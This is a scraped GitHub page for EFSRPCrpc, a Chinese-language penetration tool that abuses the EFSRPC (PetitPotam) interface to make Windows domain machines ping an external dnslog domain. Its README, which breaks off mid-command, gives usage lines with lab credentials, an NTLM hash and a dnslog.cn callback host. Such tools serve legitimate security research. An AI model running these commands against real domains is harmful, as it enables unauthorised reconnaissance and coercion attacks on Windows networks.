---
title: theLSA starred StarfireLab/EFSRPCrpc
url: https://github.com/StarfireLab/EFSRPCrpc
source: Private Feed for M09Ic
date: 2024-06-29
fetch_date: 2025-10-06T16:54:49.461759
---

# theLSA starred StarfireLab/EFSRPCrpc

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStarfireLab%2FEFSRPCrpc)

Appearance settings

* Platform

  + [GitHub Copilot

    Write better code with AI](https://github.com/features/copilot)
  + [GitHub Spark
    New

    Build and deploy intelligent apps](https://github.com/features/spark)
  + [GitHub Models
    New

    Manage and compare prompts](https://github.com/features/models)
  + [GitHub Advanced Security

    Find and fix vulnerabilities](https://github.com/security/advanced-security)
  + [Actions

    Automate any workflow](https://github.com/features/actions)

  + [Codespaces

    Instant dev environments](https://github.com/features/codespaces)
  + [Issues

    Plan and track work](https://github.com/features/issues)
  + [Code Review

    Manage code changes](https://github.com/features/code-review)
  + [Discussions

    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search

    Find more, search less](https://github.com/features/code-search)

  Explore
  + [Why GitHub](https://github.com/why-github)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)

  Integrations
  + [GitHub Marketplace](https://github.com/marketplace)
  + [MCP Registry](https://github.com/mcp)

  [View all features](https://github.com/features)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)

  By use case
  + [App Modernization](/solutions/use-case/app-modernization)
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [Events & Webinars](https://github.com/resources/events)
  + [Ebooks & Whitepapers](https://github.com/resources/whitepapers)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://github.com/partners)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors

    Fund open source developers](/sponsors)

  + [The ReadME Project

    GitHub community articles](https://github.com/readme)

  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform

    AI-powered developer platform](/enterprise)

  Available add-ons
  + [GitHub Advanced Security

    Enterprise-grade security features](https://github.com/security/advanced-security)
  + [Copilot for business

    Enterprise-grade AI features](/features/copilot/copilot-business)
  + [Premium Support

    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

[ ]
Include my email address so I can be contacted

Cancel
 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Cancel
 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FStarfireLab%2FEFSRPCrpc)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=StarfireLab%2FEFSRPCrpc)

Appearance settings

Resetting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[StarfireLab](/StarfireLab)
/
**[EFSRPCrpc](/StarfireLab/EFSRPCrpc)**
Public

* [Notifications](/login?return_to=%2FStarfireLab%2FEFSRPCrpc) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2FStarfireLab%2FEFSRPCrpc)
* [Star
   65](/login?return_to=%2FStarfireLab%2FEFSRPCrpc)

利用EFSRPC协议批量探测出网

[65
stars](/StarfireLab/EFSRPCrpc/stargazers) [2
forks](/StarfireLab/EFSRPCrpc/forks) [Branches](/StarfireLab/EFSRPCrpc/branches) [Tags](/StarfireLab/EFSRPCrpc/tags) [Activity](/StarfireLab/EFSRPCrpc/activity)

[Star](/login?return_to=%2FStarfireLab%2FEFSRPCrpc)

[Notifications](/login?return_to=%2FStarfireLab%2FEFSRPCrpc) You must be signed in to change notification settings

* [Code](/StarfireLab/EFSRPCrpc)
* [Issues
  0](/StarfireLab/EFSRPCrpc/issues)
* [Pull requests
  0](/StarfireLab/EFSRPCrpc/pulls)
* [Actions](/StarfireLab/EFSRPCrpc/actions)
* [Projects
  0](/StarfireLab/EFSRPCrpc/projects)
* [Security

  ### Uh oh!

  There was an error while loading. Please reload this page.](/StarfireLab/EFSRPCrpc/security)
* [Insights](/StarfireLab/EFSRPCrpc/pulse)

Additional navigation options

* [Code](/StarfireLab/EFSRPCrpc)
* [Issues](/StarfireLab/EFSRPCrpc/issues)
* [Pull requests](/StarfireLab/EFSRPCrpc/pulls)
* [Actions](/StarfireLab/EFSRPCrpc/actions)
* [Projects](/StarfireLab/EFSRPCrpc/projects)
* [Security](/StarfireLab/EFSRPCrpc/security)
* [Insights](/StarfireLab/EFSRPCrpc/pulse)

# StarfireLab/EFSRPCrpc

main

[Branches](/StarfireLab/EFSRPCrpc/branches)[Tags](/StarfireLab/EFSRPCrpc/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit   History[3 Commits](/StarfireLab/EFSRPCrpc/commits/main/) | | |
| [img](/StarfireLab/EFSRPCrpc/tree/main/img "img") | | [img](/StarfireLab/EFSRPCrpc/tree/main/img "img") |  |  |
| [utils](/StarfireLab/EFSRPCrpc/tree/main/utils "utils") | | [utils](/StarfireLab/EFSRPCrpc/tree/main/utils "utils") |  |  |
| [README.md](/StarfireLab/EFSRPCrpc/blob/main/README.md "README.md") | | [README.md](/StarfireLab/EFSRPCrpc/blob/main/README.md "README.md") |  |  |
| [efsrpcrpc.py](/StarfireLab/EFSRPCrpc/blob/main/efsrpcrpc.py "efsrpcrpc.py") | | [efsrpcrpc.py](/StarfireLab/EFSRPCrpc/blob/main/efsrpcrpc.py "efsrpcrpc.py") |  |  |
| [requirements.txt](/StarfireLab/EFSRPCrpc/blob/main/requirements.txt "requirements.txt") | | [requirements.txt](/StarfireLab/EFSRPCrpc/blob/main/requirements.txt "requirements.txt") |  |  |
| View all files | | |

## Repository files navigation

* README

# EFSRPCrpc

在域渗透场景中，利用EFSRPC协议(PetitPotam)通过PING外网域名的方式批量探测windows出网机器

> 免责声明：此工具仅限于安全研究，用户承担因使用此工具而导致的所有法律和相关责任！作者不承担任何法律责任！

## 使用说明

* 默认通过lsarpc管道触发EFSRPC接口,可通过`-pipe`参数指定管道 {efsr,lsarpc,samr,netlogon,lsass}
* 在windows 2008和Windows 2012的环境以下，无需域内凭证；其他windows版本利用需要一个普通域内凭证

### 使用范例

```
# 指定target
python efsrpcrpc.py -d test.lab  -dc-ip 192.168.12.250  -u admin -hashes f26fb3ae03e93ab9c81667e9d738c5d9:47bf8039a8506cd67c524a03ff84ba4e -target 192.168.12.200 -dnslog test.dnslog.cn
```

```
# 从文件中读取target
python efsrpcrpc.py -d test.lab  -dc-ip 192.168.12.250  -u admin -p Aa123456  -file file.txt -dnslog test.dnslog.cn
```

```
# 默认通过ldap查询所有域机器的DNS为target，批量PING外网dnslog域名
python efsrpcrpc.py -d test.lab  -dc-ip 192.168....